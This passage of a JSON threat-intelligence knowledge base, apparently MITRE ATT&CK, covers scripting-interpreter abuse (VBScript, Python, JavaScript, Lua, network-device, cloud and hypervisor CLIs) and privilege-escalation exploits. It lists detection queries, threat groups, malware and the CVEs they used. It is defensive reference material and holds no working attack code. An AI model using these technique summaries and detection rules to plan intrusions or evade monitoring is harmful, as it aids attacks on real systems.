      "JSS Loadercan download and execute VBScript files.[59]",
      "DuringJuicy Mix,OilRigused VBS droppers to deliver and establish persistence for theMangobackdoor.[79]",
      "Kerrdowncan use a VBS base64 decoder function published by Motobit.[80]",
      "KeyBoyuses VBS scripts for installing files and performing execution.[81]",
      "Kimsukyhas used Visual Basic to download malicious payloads.[82][83][84][85]Kimsukyhas also used malicious VBA macros within maldocs disguised as forms that trigger when a victim types any content into the lure.[85]",
      "Koadicperforms most of its operations using Windows Script Host (VBScript) and runs arbitrary shellcode .[86]",
      "KOCTOPUShas used VBScript to call wscript to execute a PowerShell command.[87]",
      "Lazarus Grouphas used VBA and embedded macros in Word documents to execute malicious code.[88][89]",
      "LazyScripterhas used VBScript to execute malicious code.[87]",
      "Leviathanhas used VBScript.[90]",
      "Lokibothas used VBS scripts and XLS macros for execution.[91]",
      "LookBackhas used VBA macros in Microsoft Word attachments to drop additional files to the host.[92]",
      "LunarMailhas been installed using a VBA macro.[93]",
      "Machetehas embedded malicious macros within spearphishing attachments to download additional files.[94]",
      "Magic Houndmalware has used VBS scripts for execution.[95]",
      "Malteirohas utilized a dropper containing malicious VBS scripts.[96]",
      "Melcozcan use VBS scripts to execute malicious DLLs.[18]",
      "Metamorfohas used VBS code on victims’ systems.[97]",
      "Mispadu’s dropper uses VBS files to install payloads and perform execution.[96][98]",
      "Moleratsused various implants, including those built with VBScript, on target machines.[99][100]",
      "MuddyWaterhas used VBScript files to execute itsPOWERSTATSpayload, as well as macros.[101][102][103][104][105][106][107][108][109]",
      "Mustang Pandahas embedded VBScript components in LNK files to download additional files and automate collection.[110][111][112]",
      "NanHaiShuexecutes additional VBScript code on the victim's machine.[113]",
      "NanoCoreuses VBS files.[114]",
      "NETWIREhas been executed through use of VBScripts.[115][116]",
      "OilRighas used VBScript macros for execution on compromised hosts.[117]",
      "OopsIEcreates and uses a VBScript as part of its persistent execution.[118][119]",
      "DuringOperation CuckooBees, the threat actors executed an encoded VBScript file usingwscriptand wrote the decoded output to a text file.[120]",
      "DuringOperation Dream Job,Lazarus Groupexecuted a VBA written malicious macro after victims download malicious DOTM files;Lazarus Groupalso used Visual Basic macro code to extract a double Base64 encoded DLL implant.[121][122]",
      "DuringOperation Dust Storm, the threat actors used Visual Basic scripts.[123]",
      "ForOperation Honeybee, the threat actors used a Visual Basic script embedded within a Word document to download an implant.[124]",
      "DuringOperation Sharpshooter, the threat actors used a VBA macro to execute a simple downloader that installedRising Sun.[125]",
      "DuringOperation Wocao, threat actors used VBScript to conduct reconnaissance on targeted systems.[126]",
      "OSX_OCEANLOTUS.Duses Word macros for execution.[127]",
      "DuringOuter Space,OilRigused VBS droppers to deploy malware.[79]",
      "Patchworkused Visual Basic Scripts (VBS) on victim machines.[128][129]",
      "PoetRAThas used Word documents with VBScripts to execute malicious activities.[130][131]",
      "PowerShowerhas the ability to save and execute VBScript.[74]",
      "POWERSTATScan use VBScript (VBE) code for execution.[105][132]",
      "Pteranodoncan use a malicious VBS file for execution.[133]",
      "QakBotcan use VBS to download and execute malicious files.[134][135][136][137][138][139][140]",
      "QUADAGENTuses VBScripts.[141]",
      "Ramsayhas included embedded Visual Basic scripts in malicious documents.[142][143]",
      "Rancorhas used VBS scripts as well as embedded macros for execution.[144]",
      "RedCurlhas used VBScript to run malicious files.[145][146]",
      "Remexiuses AutoIt and VBS scripts throughout its execution process.[147]",
      "REvilhas used obfuscated VBA macros for execution.[148][149]",
      "ROKRAThas used Visual Basic for execution.[150]",
      "Saint Bothas used.vbsscripts for execution.[151]",
      "Sandworm Teamhas created VBScripts to run an SSH server.[152][153][154][8]",
      "ShrinkLockeris a VisualBasic script (VBS) object that calls multiple other operating system functions during execution.[155][156]",
      "Sibotexecutes commands using VBScript.[157]",
      "SideCopyhas sent Microsoft Office Publisher documents to victims that have embedded malicious macros that execute an hta file via callingmshta.exe.[158]",
      "Sidewinderhas used VBScript to drop and execute malware loaders.[159]",
      "Silencehas used VBS scripts.[160]",
      "Smoke Loaderadds a Visual Basic script in the Startup folder to deploy the payload.[161]",
      "Snip3can use visual basic scripts for first-stage execution.[162][163]",
      "For theSolarWinds Compromise,APT29wrote malware such asSibotin Visual Basic.[164]",
      "Squirrelwafflehas used malicious VBA macros in Microsoft Word documents and Excel spreadsheets that execute anAutoOpensubroutine.[165][166]",
      "STARWHALEcan use the VBScript functionGetRefas part of its persistence mechanism.[167]",
      "StoneDrillhas several VBS scripts used throughout the malware's lifecycle.[168]",
      "SUNBURSTused VBScripts to initiate the execution of payloads.[169]",
      "SVCReadyhas used VBA macros to execute shellcode.[170]",
      "TA2541has used VBS files to execute or establish persistence for additional payloads, often using file names consistent with email themes or mimicking system functionality.[171][172]",
      "TA459has a VBScript for execution.[173]",
      "TA505has used VBS for code execution.[174][175][176][177]",
      "TAMECAThas used VBScript to query anti-virus products.[17]",
      "Transparent Tribehas crafted VBS-based malicious documents.[178][179]",
      "Turlahas used VBS scripts throughout its operations.[180]",
      "TYPEFRAMEhas used a malicious Word document for delivery with VBA macros for execution.[181]",
      "Ursnifdroppers have used VBA macros to download and execute the malware's full executable payload.[182]",
      "VBShowerhas the ability to execute VBScript files.[183]",
      "WhisperGatecan use a Visual Basic script to exclude theC:\\drive from Windows Defender.[184][185]",
      "Windshifthas used Visual Basic 6 (VB6) payloads.[186]",
      "WIRTEhas used VBScript  in its operations.[187]",
      "Xbashcan execute malicious VBScript payloads on the victim’s machine.[188]"
    ]
  },
  "T1059.006": {
    "Name": "Command and Scripting Interpreter:Python",
    "Description": "Adversaries may abuse Python commands and scripts for execution. Python is a very popular scripting/programming language, with capabilities to perform many functions. Python can be executed interactively from the command-line (via thepython.exeinterpreter) or via scripts (.py) that can be written and distributed to different systems. Python code can also be compiled into binary executables.[1]Python comes with many built-in packages to interact with the underlying system, such as file operations and device I/O. Adversaries can use these libraries to download and execute commands or other scripts as well as perform various malicious behaviors.",
    "Detects": [
      "Monitor systems for abnormal Python usage and python.exe behavior, which could be an indicator of malicious activity. Understanding standard usage patterns is important to avoid a high number of false positives. If scripting is restricted for normal users, then any attempts to enable scripts running on a system would be considered suspicious. If scripts are not commonly used on a system, but enabled, scripts running out of cycle from patching or other administrator functions are suspicious. Scripts should be captured from the file system when possible to determine their actions and intent. Scripts are likely to perform actions with various effects on a system that may generate events, depending on the types of monitoring used. Monitor executed commands and arguments that may abuse Python commands and scripts for execution.Analytic 1 - Look for unusual Python execution.OR sourcetype=wineventlog:security OR sourcetype=sysmonEventCode=4688 OR EventCode=1 | search (process_name=\"python.exe\" OR process_name=\"python3\" OR process_name=\"python\")| eval suspicious_script=if(match(command_line, \".-c .|.exec.|.import os.|.eval.|.base64.\"), \"True\", \"False\")| where suspicious_script=\"True\"| table _time, user, host, command_line, process_name, parent_process",
      "Monitor systems for abnormal Python usage and python.exe behavior, which could be an indicator of malicious activity. Understanding standard usage patterns is important to avoid a high number of false positives. If scripting is restricted for normal users, then any attempts to enable scripts running on a system would be considered suspicious. If scripts are not commonly used on a system, but enabled, scripts running out of cycle from patching or other administrator functions are suspicious. Scripts should be captured from the file system when possible to determine their actions and intent. Scripts are likely to perform actions with various effects on a system that may generate events, depending on the types of monitoring used. Monitor newly executed processes that may abuse Python commands and scripts for execution."
    ],
    "Procedure Examples": [
      "APT29has developed malware variants written in Python.[2]",
      "APT37has used Python scripts to execute payloads.[3]",
      "APT39has used a command line utility and a network scanner written in python.[4][5]",
      "Bandookcan support commands to execute Python-based payloads.[6]",
      "BRONZE BUTLERhas made use of Python-based remote access tools.[7]",
      "Bundlorehas used Python scripts to execute payloads.[8]",
      "Chaeshas used Python scripts for execution and the installation of additional files.[9]",
      "Cinnamon Tempesthas used a customized version of theImpacketwmiexec.py module to create renamed output files.[10]",
      "Cobalt Strikecan use Python to perform execution.[11][12][13][14]",
      "CoinTickerexecutes a Python script to download its second stage.[15]",
      "CookieMinerhas used python scripts on the user’s system, as well as the Python variant of theEmpireagent, EmPyre.[16]",
      "DuringCutting Edge, threat actors used a Python reverse shell and the PySoxy SOCKS5 proxy tool.[17][18]",
      "Donutcan generate shellcode outputs that execute via Python.[19]",
      "Dragonflyhas used various types of scripting to perform operations, including Python scripts. The group was observed installing Python 2.7 on a victim.[20]",
      "DropBookis a Python-based backdoor compiled with PyInstaller.[21]",
      "Earth Luscaused Python scripts for port scanning or building reverse shells.[22]",
      "Eburyhas used Python to implement its DGA.[23]",
      "FRAMESTINGis a Python web shell that can embed in the Ivanti Connect Secure CAV Python package.[24]",
      "IronNetInjectorcan use IronPython scripts to load payloads with the help of a .NET injector.[25]",
      "KeyBoyuses Python scripts for installing files and performing execution.[26]",
      "Keydnapuses Python for scripting to execute additional commands.[27]",
      "Kimsukyhas used a macOS Python implant to gather data as well as MailFetcher.py code to automatically collect email data.[28][29]",
      "Lumma Stealerhas used malicious Python scripts to execute payloads.[30]",
      "Macheteis written in Python and is used in conjunction with additional Python scripts.[31][32][33]",
      "Macheteused multiple compiled Python scripts on the victim’s system.Machete's main backdoorMacheteis also written in Python.[34][31][33]",
      "MechaFlounderuses a python-based payload.[35]",
      "MuddyWaterhas developed tools in Python includingOut1.[36]",
      "Neo-reGeorgis a Python-based web shell.[37]",
      "DuringOperation Wocao, threat actors' backdoors were written in Python and compiled with py2exe.[38]",
      "PoetRATwas executed with a Python script and worked in conjunction with additional Python-based post-exploitation tools.[39]",
      "PUNCHBUGGYhas used python scripts.[40]",
      "Pupycan use an add on feature when creating payloads that allows you to create custom Python scripts (\"scriptlets\") to perform tasks offline (without requiring a session) such as sandbox detection, adding persistence, etc.[41]",
      "PyDCrypt, along with its functions, is written in Python.[42]",
      "Pysahas used Python scripts to deploy ransomware.[43]",
      "RedCurlhas used a Python script to establish outbound communication and to execute commands using SMB port 445.[44]",
      "reGeorgis a Python-based web shell.[45]",
      "Remcosuses Python scripts.[46]",
      "Rockehas used Python-based malware to install and spread their coinminer.[47]",
      "DuringShadowRay, threat actors used the Pythonptymodule to open reverse shells.[48]",
      "SILENTTRINITYis written in Python and can use multiple Python scripts for execution on targeted systems.[49][50]",
      "Small Sievecan use Python scripts to execute commands.[51]",
      "SpeakUpuses Python scripts.[52]",
      "Tonto Teamhas used Python-based tools for execution.[53]",
      "Turianhas the ability to use Python to spawn a Unix shell.[54]",
      "Turlahas used IronPython scripts as part of theIronNetInjectortoolchain to drop payloads.[25]",
      "UPSTYLEis a Python-based application.[55][56]",
      "ZIRCONIUMhas used Python-based implants to interact with compromised hosts.[57][1]"
    ]
  },
  "T1059.007": {
    "Name": "Command and Scripting Interpreter:JavaScript",
    "Description": "Adversaries may abuse various implementations of JavaScript for execution. JavaScript (JS) is a platform-independent scripting language (compiled just-in-time at runtime) commonly associated with scripts in webpages, though JS can be executed in runtime environments outside the browser.[1]JScript is the Microsoft implementation of the same scripting standard. JScript is interpreted via the Windows Script engine and thus integrated with many components of Windows such as theComponent Object Modeland Internet Explorer HTML Application (HTA) pages.[2][3][4]JavaScript for Automation (JXA) is a macOS scripting language based on JavaScript, included as part of Apple’s Open Scripting Architecture (OSA), that was introduced in OSX 10.10. Apple’s OSA provides scripting capabilities to control applications, interface with the operating system, and bridge access into the rest of Apple’s internal APIs. As of OSX 10.10, OSA only supports two languages, JXA andAppleScript. Scripts can be executed via the command line utilityosascript, they can be compiled into applications or script files viaosacompile, and they can be compiled and executed in memory of other programs by leveraging the OSAKit Framework.[5][6][7][8][9]Adversaries may abuse various implementations of JavaScript to execute various behaviors. Common uses include hosting malicious scripts on websites as part of aDrive-by Compromiseor downloading and executing these script files as secondary payloads. Since these payloads are text-based, it is also very common for adversaries to obfuscate their content as part ofObfuscated Files or Information.",
    "Detects": [
      "Scripting execution is likely to perform actions with various effects on a system that may generate events, depending on the types of monitoring used. Monitor processes and command-line arguments for execution and subsequent behavior. Actions may be related to network and system informationDiscovery,Collection, or other programmable post-compromise behaviors and could be used as indicators of detection leading back to the source. Monitor for execution of JXA throughosascriptand usage ofOSAScriptAPI that may be related to other suspicious behavior occurring on the system.",
      "Monitor for the loading of modules associated with scripting languages (ex: JScript.dll).",
      "Monitor for events associated with scripting execution, such as process activity, usage of the Windows Script Host (typically cscript.exe or wscript.exe), file activity involving scripts",
      "Monitor for any attempts to enable scripts running on a system that would be considered suspicious. If scripts are not commonly used on a system, but enabled, scripts running out of cycle from patching or other administrator functions are suspicious. Scripts should be captured from the file system when possible to determine their actions and intent."
    ],
    "Procedure Examples": [
      "AppleSeedhas the ability to use JavaScript to execute PowerShell.[10]",
      "APT32has used JavaScript for drive-by downloads and C2 communications.[11][12]",
      "Astarothuses JavaScript to perform its core functionalities.[13][14]",
      "Avaddonhas been executed through a malicious JScript downloader.[15][16]",
      "BlackByte Ransomwareis distributed as a JavaScript launcher file.[17]",
      "Bundlorecan execute JavaScript by injecting it into the victim's browser.[18]",
      "DuringC0015, the threat actors used a malicious HTA file that contained a mix of encoded HTML and JavaScript/VBScript code.[19]",
      "DuringC0017,APT41deployed JScript web shells on compromised systems.[20]",
      "Chaeshas used JavaScript and Node.Js information stealer script that exfiltrates data using the node process.[21]",
      "Cobalt Grouphas executed JavaScript scriptlets on the victim's machine.[22][23][24][25][26][27]",
      "TheCobalt StrikeSystem Profiler can use JavaScript to perform reconnaissance actions.[28]",
      "DarkWatchmanuses JavaScript to perform its core functionalities.[29]",
      "Donutcan generate shellcode outputs that execute via JavaScript or JScript.[30]",
      "Earth Luscahas manipulated legitimate websites to inject malicious JavaScript code as part of their watering hole operations.[31]",
      "EnvyScoutcan write files to disk with JavaScript using a modified version of the open-source tool FileSaver.[32]",
      "Evilnumhas used malicious JavaScript files on the victim's machine.[33]",
      "FIN6has used malicious JavaScript to steal payment card data from e-commerce sites.[34]",
      "FIN7used JavaScript scripts to help perform tasks on the victim's machine.[35][36][35]",
      "FRPcan support the use of a JSON configuration file.[37]",
      "Gootloadercan execute a Javascript file for initial infection.[38][39]",
      "GRIFFONis written in and executed asJavaScript.[40]",
      "Higaisaused JavaScript to execute additional files.[41][42][43]",
      "Indrik Spiderhas used malicious JavaScript files for several components of their attack.[44]",
      "InvisiMolecan use a JavaScript file as part of its execution chain.[45]",
      "jRAThas been distributed as HTA files with JScript.[46]",
      "JSS Loadercan download and execute JavaScript files.[47]",
      "Kimsukyhas used JScript for logging and downloading additional tools.[48][49]Kimsukyhas usedTRANSLATEXT, which contained four Javascript files for bypassing defenses, collecting sensitive information and screenshots, and exfiltrating data.[50]",
      "KONNIhas executed malicious JavaScript code.[51]",
      "KOPILUWAKhad used Javascript to perform its core functions.[52]",
      "Latrodectushas used JavaScript files as part its infection chain during malicious spam  email campaigns.[53][54][55]",
      "LazyScripterhas used JavaScript in its attacks.[56]",
      "Leafminerinfected victims using JavaScript code.[57]",
      "Metamorfoincludes payloads written in JavaScript.[58]",
      "Moleratsused various implants, including those built with JS, on target machines.[59]",
      "MoustachedBouncerhas used JavaScript to deliver malware hosted on HTML pages.[60]",
      "MuddyWaterhas used JavaScript files to execute itsPOWERSTATSpayload.[61][62][63]",
      "NanHaiShuexecutes additional Jscript code on the victim's machine.[64]",
      "DuringOperation Dust Storm, the threat actors used JavaScript code.[65]",
      "Pikabot Distribution February 2024utilized obfuscated JavaScript files for initialPikabotpayload download.[66]",
      "POWERSTATScan use JavaScript code for execution.[61]",
      "TheQakBotweb inject module can inject Java Script into web banking pages visited by the victim.[67][68]",
      "Saint Bearhas delivered malicious Microsoft Office files containing an embedded JavaScript object that would, on execution, download and executeOutSteelandSaint Bot.[69]",
      "Sidewinderhas used JavaScript to drop and execute malware loaders.[70][71]",
      "Silencehas used JS scripts.[72]",
      "TheSocGholishpayload is executed as JavaScript.[73][74][75][76]",
      "SpicyOmelettehas the ability to execute arbitrary JavaScript code on a compromised host.[77]",
      "Star Blizzardhas used JavaScript to redirect victim traffic from an adversary controlled server to a server hosting the Evilginx phishing framework.[78]",
      "StrelaStealerhas been distributed as a malicious JavaScript object.[79][80][81]",
      "TA505has used JavaScript for code execution.[82][83]",
      "TA577has used JavaScript to execute additional malicious payloads.[84]",
      "TA578has used JavaScript files in malware execution chains.[84]",
      "Turlahas used various JavaScript-based backdoors.[85]",
      "Valakcan execute JavaScript containing configuration data for establishing persistence.[86]",
      "WARPWIREis a credential harvester written in JavaScript.[87]",
      "Water Curupira Pikabot Distributioninitial delivery included obfuscated JavaScript objects stored in password-protected ZIP archives.[88]",
      "Winter Viverndelivered malicious JavaScript to exploit targets when exploiting Roundcube Webmail servers.[89]",
      "Xbashcan execute malicious JavaScript payloads on the victim’s machine.[90]"
    ]
  },
  "T1059.008": {
    "Name": "Command and Scripting Interpreter:Network Device CLI",
    "Description": "Adversaries may abuse scripting or built-in command line interpreters (CLI) on network devices to execute malicious command and payloads. The CLI is the primary means through which users and administrators interact with the device in order to view system information, modify device operations, or perform diagnostic and administrative functions. CLIs typically contain various permission levels required for different commands.Scripting interpreters automate tasks and extend functionality beyond the command set included in the network OS. The CLI and scripting interpreter are accessible through a direct console connection, or through remote means, such as telnet orSSH.Adversaries can use the network CLI to change how network devices behave and operate. The CLI may be used to manipulate traffic flows to intercept or manipulate data, modify startup configuration parameters to load malicious system software, or to disable security features or logging to avoid detection.[1]",
    "Detects": [
      "Consider reviewing command history in either the console or as part of the running memory to determine if unauthorized or suspicious commands were used to modify device configuration.[6]Consider comparing a copy of the network device configuration against a known-good version to discover unauthorized changes to the command interpreter. The same process can be accomplished through a comparison of the run-time memory, though this is non-trivial and may require assistance from the vendor."
    ],
    "Procedure Examples": [
      "Line Dancercan execute native commands in networking device command line interfaces.[2][3]"
    ]
  },
  "T1059.009": {
    "Name": "Command and Scripting Interpreter:Cloud API",
    "Description": "Adversaries may abuse cloud APIs to execute malicious commands. APIs available in cloud environments provide various functionalities and are a feature-rich method for programmatic access to nearly all aspects of a tenant. These APIs may be utilized through various methods such as command line interpreters (CLIs), in-browser Cloud Shells,PowerShellmodules like Azure for PowerShell[1], or software developer kits (SDKs) available for languages such asPython.Cloud API functionality may allow for administrative access across all major services in a tenant such as compute, storage, identity and access management (IAM), networking, and security policies.With proper permissions (often via use of credentials such asApplication Access TokenandWeb Session Cookie), adversaries may abuse cloud APIs to invoke various functions that execute malicious actions. For example, CLI and PowerShell functionality may be accessed through binaries installed on cloud-hosted or on-premises hosts or accessed through a browser-based cloud shell offered by many cloud platforms (such as AWS, Azure, and GCP). These cloud shells are often a packaged unified environment to use CLI and/or scripting modules hosted as a container in the cloud environment.",
    "Detects": [
      "Consider reviewing command history in either host machines or cloud audit logs to determine if unauthorized or suspicious commands were executed.Cloud API activity logging is typically enabled by default and may be reviewed in sources like the Microsoft Unified Audit Log, AWS CloudTrail, and GCP Admin Activty logs. Review these sources for history of executed API commands. Host logs may also be reviewed to capture CLI commands or PowerShell module usage to invoke Cloud API functions."
    ],
    "Procedure Examples": [
      "APT29has leveraged the Microsoft Graph API to perform various actions across Azure and M365 environments. They have also utilized AADInternals PowerShell Modules to access the API[2]",
      "Paculeverages the AWS CLI for its operations.[3]",
      "TeamTNThas leveraged AWS CLI to enumerate cloud environments with compromised credentials.[4]"
    ]
  },
  "T1059.010": {
    "Name": "Command and Scripting Interpreter:AutoHotKey & AutoIT",
    "Description": "Adversaries may execute commands and perform malicious tasks using AutoIT and AutoHotKey automation scripts. AutoIT and AutoHotkey (AHK) are scripting languages that enable users to automate Windows tasks. These automation scripts can be used to perform a wide variety of actions, such as clicking on buttons, entering text, and opening and closing programs.[1][2]Adversaries may use AHK (.ahk) and AutoIT (.au3) scripts to execute malicious code on a victim's system. For example, adversaries have used for AHK to execute payloads and other modular malware such as keyloggers. Adversaries have also used custom AHK files containing embedded malware asPhishingpayloads.[3]These scripts may also be compiled into self-contained executable payloads (.exe).[1][2]",
    "Detects": [
      "Monitor executed commands and arguments for abnormal usage of utilities and command-line arguments that may be used in support of malicious execution. Compare recent invocations ofAutoIt3.exeandAutoHotkey.exewith prior history of known good arguments to determine anomalous and potentially adversarial activity (ex: obfuscated and/or malicious commands).",
      "Monitor and analyze the execution and arguments of theAutoIt3.exeandAutoHotkey.exeinterpreters. Non-standard process execution trees may also indicate suspicious or malicious behavior, such as ifAutoHotkey.exeis the parent process for additional suspicious processes and activity."
    ],
    "Procedure Examples": [
      "APT39has utilized AutoIt malware scripts embedded in Microsoft Office documents or malicious links.[4]",
      "DarkGateuses AutoIt scripts dropped to a hidden directory during initial installation phases, such astest.au3.[5]",
      "Lumma Stealerhas utilized AutoIt malware scripts and AutoIt executables.[6][7]",
      "Melcozhas been distributed through an AutoIt loader script.[8]",
      "OutSteelwas developed using the AutoIT scripting language.[9]",
      "XLoadercan use an AutoIT script to decrypt a payload file, load it into victim memory, then execute it on the victim machine.[10]"
    ]
  },
  "T1059.011": {
    "Name": "Command and Scripting Interpreter:Lua",
    "Description": "Adversaries may abuse Lua commands and scripts for execution. Lua is a cross-platform scripting and programming language primarily designed for embedded use in applications. Lua can be executed on the command-line (through the stand-alone lua interpreter), via scripts (.lua), or from Lua-embedded programs (through thestruct lua_State).[1][2]Lua scripts may be executed by adversaries for malicious purposes. Adversaries may incorporate, abuse, or replace existing Lua interpreters to allow for malicious Lua command execution at runtime.[3][4][5][6]",
    "Detects": [
      "Monitor command-line arguments for script execution and subsequent behavior. Actions may be related to network and system information Discovery, Collection, or other scriptable post-compromise behaviors such as usingos.executeto execute operating system commands.",
      "Monitor for any attempts to enable scripts running on a system that would be considered suspicious. If scripts are not commonly used on a system, but enabled, scripts running out of cycle from patching or other administrator functions are suspicious. Scripts should be captured from the file system when possible to determine their actions and intent."
    ],
    "Procedure Examples": [
      "EvilBunnyhas used Lua scripts to execute payloads.[5]",
      "Line Runnerutilizes Lua scripts for command execution.[7][8]",
      "PoetRAThas executed a Lua script through a Lua interpreter for Windows.[9]",
      "Remseccan use modules written in Lua for execution.[6]"
    ]
  },
  "T1059.012": {
    "Name": "Command and Scripting Interpreter:Hypervisor CLI",
    "Description": "Adversaries may abuse hypervisor command line interpreters (CLIs) to execute malicious commands. Hypervisor CLIs typically enable a wide variety of functionality for managing both the hypervisor itself and the guest virtual machines it hosts.For example, on ESXi systems, tools such asesxcliandvim-cmdallow administrators to configure firewall rules and log forwarding on the hypervisor, list virtual machines, start and stop virtual machines, and more.[1][2][3]Adversaries may be able to leverage these tools in order to support further actions, such asFile and Directory DiscoveryorData Encrypted for Impact.",
    "Detects": [
      "Monitor command-line arguments made using hypervisor CLIs. Actions may be related to network and system information discovery, collection, or other post-compromise behaviors. On ESXi systems, monitor logs such as/var/log/shell.logto track executed commands.[6]Analytic 1 - Logged Shell Commandsindex=esxi_logs sourcetype=shell_log| rex field=_raw \"(?i)(?(esxcli|vim-cmd)\\s+[\\w-/]+)\"| search command=\"esxcli\" OR command=\"vim-cmd\"| eval suspicious=if(like(command, \"%firewall%\") OR like(command, \"%loghost%\") OR like(command, \"%vmsvc%\"), 1, 0)| stats count by command, user, host, _time, suspicious| where suspicious=1"
    ],
    "Procedure Examples": [
      "Cheerscrypt has leveragedesxcliin order to terminate running virtual machines.[4]",
      "Royal ransomware usesesxclito gather a list of running VMs and terminate them.[5]"
    ]
  },
  "T1068": {
    "Name": "Exploitation for Privilege Escalation",
    "Description": "Adversaries may exploit software vulnerabilities in an attempt to elevate privileges. Exploitation of a software vulnerability occurs when an adversary takes advantage of a programming error in a program, service, or within the operating system software or kernel itself to execute adversary-controlled code. Security constructs such as permission levels will often hinder access to information and use of certain techniques, so adversaries will likely need to perform privilege escalation to include use of software exploitation to circumvent those restrictions.When initially gaining access to a system, an adversary may be operating within a lower privileged process which will prevent them from accessing certain resources on the system. Vulnerabilities may exist, usually in operating system components and software commonly running at higher permissions, that can be exploited to gain higher levels of access on the system. This could enable someone to move from unprivileged or user level permissions to SYSTEM or root permissions depending on the component that is vulnerable. This could also enable an adversary to move from a virtualized environment, such as within a virtual machine or container, onto the underlying host. This may be a necessary step for an adversary compromising an endpoint system that has been properly configured and limits other privilege escalation methods.Adversaries may bring a signed vulnerable driver onto a compromised machine so that they can exploit the vulnerability to execute code in kernel mode. This process is sometimes referred to as Bring Your Own Vulnerable Driver (BYOVD).[1][2]Adversaries may include the vulnerable driver with files delivered during Initial Access or download it to a compromised system viaIngress Tool TransferorLateral Tool Transfer.",
    "Detects": [
      "Detecting software exploitation may be difficult depending on the tools available. Software exploits may not always succeed or may cause the exploited process to become unstable or crash. Also look for behavior on the endpoint system that might indicate successful compromise, such as abnormal behavior of the processes. This could include suspicious files written to disk, evidence ofProcess Injectionfor attempts to hide execution or evidence of Discovery. Consider monitoring for the presence or loading (ex: Sysmon Event ID 6) of known vulnerable drivers that adversaries may drop and exploit to execute code in kernel mode.[52]Higher privileges are often necessary to perform additional actions such as some methods ofOS Credential Dumping. Look for additional activity that may indicate an adversary has gained higher privileges.",
      "Monitor for newly executed processes that may exploit software vulnerabilities in an attempt to elevate privileges. After gaining initial access to a system, threat actors attempt to escalate privileges as they may be operating within a lower privileged process which does not allow them to access protected information or carry out tasks which require higher permissions. A common way of escalating privileges in a system is by externally invoking and exploiting spoolsv or connhost executables, both of which are legitimate Windows applications. This query searches for an invocation of either of these executables by a user, thus alerting us of any potentially malicious activity.Note: Event IDs are for Sysmon (Event ID 1 - process create) and Windows Security Log (Event ID 4688 - a new process has been created). The Analytic is oriented around looking for an invocation of either spoolsv.exe or conhost.exe by a user, thus alerting us of any potentially malicious activity. A common way of escalating privileges in a system is by externally invoking and exploiting these executables, both of which are legitimate Windows applications.Analytic 1 - Unusual Child Process for spoolsv.exe or connhost.exe(source=\"WinEventLog:Microsoft-Windows-Sysmon/Operational\" EventCode=\"1\") OR (source=\"WinEventLog:Security\" EventCode=\"4688\") (Image=\"C:\\Windows\\System32\\spoolsv.exe\" OR Image=\"C:\\Windows\\System32\\conhost.exe\") AND ParentImage= \"C:\\Windows\\System32\\cmd.exe\")"
    ],
    "Procedure Examples": [
      "APT28has exploited CVE-2014-4076, CVE-2015-2387, CVE-2015-1701, CVE-2017-0263, and CVE-2022-38028 to escalate privileges.[3][4][5][6]",
      "APT29has exploited CVE-2021-36934 to escalate privileges on a compromised host.[7]",
      "APT32has used CVE-2016-7255 to escalate privileges.[8]",
      "APT33has used a publicly available exploit for CVE-2017-0213 to escalate privileges on a local system.[9]",
      "BITTERhas exploited CVE-2021-1732 for privilege escalation.[10][11]",
      "BlackBytehas exploited CVE-2024-37085 in VMWare ESXi software for authentication bypass and subsequent privilege escalation.[12]",
      "BlackByte 2.0 Ransomwareexploits a vulnerability in the RTCore64.sys driver (CVE-2019-16098) to enable privilege escalation and defense evasion when run as a service.[13]",
      "Carberphas exploited multiple Windows vulnerabilities (CVE-2010-2743, CVE-2010-3338, CVE-2010-4398, CVE-2008-1084) and a .NET Runtime Optimization vulnerability for privilege escalation.[14][15]",
      "Cobalt Grouphas used exploits to increase their levels of rights and privileges.[16]",
      "Cobalt Strikecan exploit vulnerabilities such as MS14-058.[17][18]",
      "CosmicDukeattempts to exploit privilege escalation vulnerabilities CVE-2010-0232 or CVE-2010-4398.[19]",
      "Empirecan exploit vulnerabilities such as MS16-032 and MS16-135.[20]",
      "FIN6has used tools to exploit Windows vulnerabilities in order to escalate privileges. The tools targeted CVE-2013-3660, CVE-2011-2005, and CVE-2010-4398, all of which could allow local users to access kernel-level privileges.[21]",
      "FIN8has exploited the CVE-2016-0167 local vulnerability.[22][23]",
      "HAFNIUMhas targeted unpatched applications to elevate access in targeted organizations.[24]",
      "Hildegardhas used the BOtB tool which exploits CVE-2019-5736.[25]",
      "InvisiMolehas exploited CVE-2007-5633 vulnerability in the speedfan.sys driver to obtain kernel mode privileges.[1]",
      "JHUHUGIThas exploited CVE-2015-1701 and CVE-2015-2387 to escalate privileges.[26][27]",
      "LAPSUS$has exploited unpatched vulnerabilities on internally accessible servers including JIRA, GitLab, and Confluence for privilege escalation.[28]",
      "Leviathanexploited software vulnerabilities in victim environments to escalate privileges duringLeviathan Australian Intrusions.[29]",
      "MoustachedBouncerhas exploited CVE-2021-1732 to execute malware components with elevated rights.[30]",
      "OilRighas exploited the Windows Kernel Elevation of Privilege vulnerability, CVE-2024-30088.[31]",
      "Pandoracan use CVE-2017-15303 to bypass Windows Driver Signature Enforcement (DSE) protection and load its driver.[32]",
      "PLATINUMhas leveraged a zero-day vulnerability to escalate privileges.[33]",
      "PoshC2contains modules for local privilege escalation exploits such as CVE-2016-9192 and CVE-2016-0099.[34]",
      "ProLockcan use CVE-2019-0859 to escalate privileges on a compromised host.[35]",
      "Remsechas a plugin to drop and execute vulnerable Outpost Sandbox or avast! Virtualization drivers in order to gain kernel mode privileges.[36]",
      "Scattered Spiderhas deployed a malicious kernel driver through exploitation of CVE-2015-2291 in the Intel Ethernet diagnostics driver for Windows (iqvw64.sys).[37]",
      "DuringShadowRay, threat actors downloaded a privilege escalation payload to gain root access.[38]",
      "Siloscapehas leveraged a vulnerability in Windows containers to perform anEscape to Host.[39]",
      "Stuxnetused MS10-073 and an undisclosed Task Scheduler vulnerability to escalate privileges on local Windows machines.[40]",
      "Threat Group-3390has used CVE-2014-6324 and CVE-2017-0213 to escalate privileges.[41][42]",
      "Tonto Teamhas exploited CVE-2019-0803 and MS16-032 to escalate privileges.[43]",
      "Turlahas exploited vulnerabilities in the VBoxDrv.sys driver to obtain kernel mode privileges.[2]",
      "Volt Typhoonhas gained initial access by exploiting privilege escalation vulnerabilities in the operating system or network services.[44]",
      "Whiteflyhas used an open-source tool to exploit a known Windows privilege escalation vulnerability (CVE-2016-0051) on unpatched computers.[45]",
      "Wingbirdexploits CVE-2016-4117 to allow an executable to gain escalated privileges.[46]",
      "XCSSEThas used a zero-day exploit in the ssh launchdaemon to elevate privileges and bypass SIP.[47]",
